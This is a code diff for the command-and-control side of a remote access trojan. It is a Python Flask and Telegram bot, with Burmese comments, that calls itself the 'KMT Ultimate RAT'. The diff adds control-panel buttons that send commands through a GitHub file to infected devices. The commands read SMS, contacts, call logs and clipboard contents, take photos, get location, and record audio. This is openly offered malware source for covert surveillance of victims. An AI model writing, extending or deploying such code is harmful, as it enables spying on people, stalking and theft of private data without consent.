@@ -10,7 +10,8 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "KMT RAT Bot is running live!"
+    app_status = "KMT Ultimate RAT Bot is running live!"
+    return app_status
 
 # 2. Telegram & GitHub Setup
 TOKEN = os.environ.get('BOT_TOKEN')
@@ -40,7 +41,7 @@ def update_github(command):
         }
         requests.put(url, headers=headers, json=data)
 
-# 3. Telegram Start Command & Control Panel (ခလုတ်များ)
+# 3. Telegram Control Panel (ခလုတ်များ အစုံအလင်)
 @bot.message_handler(commands=['start', 'panel'])
 def send_control_panel(message):
     markup = telebot.types.InlineKeyboardMarkup(row_width=2)
@@ -50,51 +51,42 @@ def send_control_panel(message):
     btn_contacts = telebot.types.InlineKeyboardButton("📇 Get Contacts", callback_data="cmd_contacts")
     btn_cam = telebot.types.InlineKeyboardButton("📸 Take Photo", callback_data="cmd_cam")
     btn_loc = telebot.types.InlineKeyboardButton("📍 Get Location", callback_data="cmd_loc")
-    btn_clear = telebot.types.InlineKeyboardButton("🧹 Clear Command", callback_data="cmd_clear")
+    btn_clipboard = telebot.types.InlineKeyboardButton("📋 Clipboard", callback_data="cmd_clipboard")
+    btn_calls = telebot.types.InlineKeyboardButton("📞 Call Logs", callback_data="cmd_calls")
+    btn_mic = telebot.types.InlineKeyboardButton("🎤 Record Audio", callback_data="cmd_mic")
+    btn_clear = telebot.types.InlineKeyboardButton("🧹 Clear / IDLE", callback_data="cmd_clear")
     
-    markup.add(btn_info, btn_sms, btn_contacts, btn_cam, btn_loc, btn_clear)
+    markup.add(btn_info, btn_sms, btn_contacts, btn_cam, btn_loc, btn_clipboard, btn_calls, btn_mic, btn_clear)
     
     bot.send_message(
         message.chat.id, 
-        "🔥 **KMT RAT Control Panel** 🔥\n\nလိုချင်သော အမိန့် (Command) ကို အောက်ပါခလုတ်များမှ ရွေးချယ်ပါ:", 
+        "🔥 **KMT ULTIMATE RAT CONTROL PANEL** 🔥\n\nလိုအပ်သော အမိန့် (Command) ကို ရွေးချယ်ပါ:", 
         reply_markup=markup,
         parse_mode="Markdown"
     )
 
-# 4. Callback Queries (ခလုတ်နှိပ်လိုက်သည့်အခါ လုပ်ဆောင်ချက်များ)
+# 4. Callback Queries (ခလုတ်များ အလုပ်လုပ်ပုံ)
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     chat_id = call.message.chat.id
     
-    if call.data == "cmd_info":
-        update_github("CMD: GET_INFO")
-        bot.answer_callback_query(call.id, "Device Info command sent!")
-        bot.send_message(chat_id, "📱 Device Info တောင်းဆိုသည့် အမိန့်ကို ပို့ပြီးပါပြီ။")
-        
-    elif call.data == "cmd_sms":
-        update_github("CMD: READ_SMS")
-        bot.answer_callback_query(call.id, "Read SMS command sent!")
-        bot.send_message(chat_id, "✉️ SMS ဖတ်ရန် အမိန့်ကို ပို့ပြီးပါပြီ။")
-        
-    elif call.data == "cmd_contacts":
-        update_github("CMD: GET_CONTACTS")
-        bot.answer_callback_query(call.id, "Get Contacts command sent!")
-        bot.send_message(chat_id, "📇 Contacts ယူရန် အမိန့်ကို ပို့ပြီးပါပြီ။")
-        
-    elif call.data == "cmd_cam":
-        update_github("CMD: TAKE_PHOTO")
-        bot.answer_callback_query(call.id, "Take Photo command sent!")
-        bot.send_message(chat_id, "📸 ဓာတ်ပုံရိုက်ရန် အမိန့်ကို ပို့ပြီးပါပြီ။")
-        
-    elif call.data == "cmd_loc":
-        update_github("CMD: GET_LOCATION")
-        bot.answer_callback_query(call.id, "Get Location command sent!")
-        bot.send_message(chat_id, "📍 တည်နေရာ (Location) ယူရန် အမိန့်ကို ပို့ပြီးပါပြီ။")
-        
-    elif call.data == "cmd_clear":
-        update_github("IDLE")
-        bot.answer_callback_query(call.id, "Command cleared!")
-        bot.send_message(chat_id, "🧹 Command ကို IDLE (ဘာမှမလုပ်ရန်) သို့ ပြောင်းလိုက်ပါပြီ။")
+    commands_map = {
+        "cmd_info": ("CMD: GET_INFO", "📱 Device Info တောင်းဆိုသည့် အမိန့် ပို့ပြီးပါပြီ။"),
+        "cmd_sms": ("CMD: READ_SMS", "✉️ SMS ဖတ်ရန် အမိန့် ပို့ပြီးပါပြီ။"),
+        "cmd_contacts": ("CMD: GET_CONTACTS", "📇 Contacts ယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
+        "cmd_cam": ("CMD: TAKE_PHOTO", "📸 ဓာတ်ပုံရိုက်ရန် အမိန့် ပို့ပြီးပါပြီ။"),
+        "cmd_loc": ("CMD: GET_LOCATION", "📍 တည်နေရာယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
+        "cmd_clipboard": ("CMD: GET_CLIPBOARD", "📋 Clipboard စာသား ယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
+        "cmd_calls": ("CMD: GET_CALLS", "📞 Call Logs မှတ်တမ်း ယူရန် အမိန့် ပို့ပြီးပါပြီ။"),
+        "cmd_mic": ("CMD: RECORD_AUDIO", "🎤 အသံဖမ်းရန် အမိန့် ပို့ပြီးပါပြီ။"),
+        "cmd_clear": ("IDLE", "🧹 Command ကို IDLE သို့ ပြောင်းလိုက်ပါပြီ။")
+    }
+    
+    if call.data in commands_map:
+        cmd_text, msg_text = commands_map[call.data]
+        update_github(cmd_text)
+        bot.answer_callback_query(call.id, "Command Executed!")
+        bot.send_message(chat_id, msg_text)
 
 # 5. Background Thread & Flask Run
 def run_bot():
